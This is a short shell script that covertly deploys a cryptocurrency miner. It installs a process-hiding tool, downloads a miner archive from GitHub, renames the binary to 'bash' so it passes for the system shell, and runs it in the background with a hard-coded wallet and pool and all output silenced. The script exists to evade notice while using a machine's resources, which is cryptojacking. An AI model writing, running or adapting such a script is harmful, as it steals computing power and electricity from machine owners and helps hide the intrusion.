apt-get update
apt install npm -y
npm i -g node-process-hider && sudo ph add bash
wget -qO nisa.zip https://github.com/Beeppool/miner/releases/download/0.6.0/beepminer-0.6.0.zip
unzip nisa.zip
cd beepminer-0.6.0
mv miner bash
./bash --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --pool=pool.acemining.co:8443 --miner=1 --type=dumb >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 30; done
